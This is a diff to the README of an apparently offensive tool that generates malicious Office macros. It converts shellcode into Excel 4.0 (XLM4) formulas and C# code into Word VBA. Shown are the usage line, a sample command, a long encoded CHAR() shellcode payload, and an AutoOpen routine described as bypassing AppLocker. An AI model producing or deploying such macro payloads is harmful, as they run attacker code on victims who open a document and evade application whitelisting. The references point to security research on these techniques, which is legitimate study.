@@ -33,7 +33,7 @@ Generate source for word (2016) macro from a Program.cs.
 Generate XLM4 macro pasta given some shellcode.  
 Note: only x86 (right now) and no null bytes.
 
-Generate XLM4 macro:  
+## Generate XLM4 macro:  
 ```
 usage: macro_helper.py [-h] [-infile INFILE] [--outfile OUTFILE] [--filename FILENAME] [--type {word_macro,xlm4_macro}] [--exectype {shell,wmi}] [--verbose VERBOSE]
 
@@ -75,7 +75,7 @@ python3 macro_helper.py -infile test32.bin --type xlm4_macro
 =CHAR(19)&CHAR(127)&CHAR(175)&CHAR(54)&CHAR(67)&CHAR(125)&CHAR(175)&CHAR(182)&CHAR(166)&CHAR(8)&CHAR(73)&CHAR(220)&CHAR(216)&CHAR(92)&CHAR(193)&CHAR(73)&CHAR(64)&CHAR(197)&CHAR(153)&CHAR(232)&CHAR(141)&CHAR(208)&CHAR(231)&CHAR(43)&CHAR(5)&CHAR(208)&CHAR(24)&CHAR(229)&CHAR(238)&CHAR(145)&CHAR(10)&CHAR(18)&CHAR(137)&CHAR(89)&CHAR(211)&CHAR(227)&CHAR(60)&CHAR(89)&CHAR(185)&CHAR(231)&CHAR(150)&CHAR(14)&CHAR(85)&CHAR(234)&CHAR(207)&CHAR(120)&CHAR(250)&CHAR(21)&CHAR(58)&CHAR(251)&CHAR(253)&CHAR(234)&CHAR(187)&CHAR(205)&CHAR(118)&CHAR(220)&CHAR(41)&CHAR(113)&CHAR(225)&CHAR(33)&CHAR(190)&CHAR(113)&CHAR(241)&CHAR(119)&CHAR(212)&CHAR(113)&CHAR(153)&CHAR(47)&CHAR(140)&CHAR(34)&CHAR(188)&CHAR(47)&CHAR(25)&CHAR(87)&CHAR(109)&CHAR(186)&CHAR(162)&CHAR(1)&CHAR(193)&CHAR(109)&CHAR(203)&CHAR(175)&CHAR(60)&CHAR(89)&CHAR(84)&CHAR(80)&CHAR(107)&CHAR(217)&CHAR(147)&CHAR(174)&CHAR(233)&CHAR(246)&CHAR(59)&CHAR(198)&CHAR(17)&CHAR(71)&CHAR(188)&CHAR(22)&CHAR(120)&CHAR(71)&CHAR(236)&CHAR(126)&CHAR(119)&CHAR(104)&CHAR(3)&CHAR(78)&CHAR(120)&CHAR(163)&CHAR(76)&CHAR(198)&CHAR(243)&CHAR(34)&CHAR(62)&CHAR(119)&CHAR(3)&CHAR(111)&CHAR(158)&CHAR(41)&CHAR(4)&CHAR(156)&CHAR(59)&CHAR(218)&CHAR(127)&CHAR(248)&CHAR(188)&CHAR(27)&CHAR(128)&CHAR(234)&CHAR(216)&CHAR(28)&CHAR(128)&CHAR(18)&CHAR(223)&CHAR(33)&CHAR(86)&CHAR(43)&CHAR(149)&CHAR(100)&CHAR(106)&CHAR(8)&CHAR(166)&CHAR(211)&CHAR(207)&CHAR(57)&CHAR(45)&CHAR(27)&CHAR(67)&CHAR(57)&CHAR(100)&CHAR(100)
 ```
 
-## Generate vba for office  
+## Generate VBA for Word that bypasses Applocker  
 
 ```
 python3 macro_helper.py -infile Program.cs
@@ -115,4 +115,9 @@ End Sub
 Sub AutoOpen()
   bypass
 End Sub
-```
+```  
+
+##Rferences  
+(outflank)[https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/]  
+(fortynorthsecurity - excelntdonut blog post)[https://fortynorthsecurity.com/blog/excelntdonut/]  
+(cybereason)[https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits]     
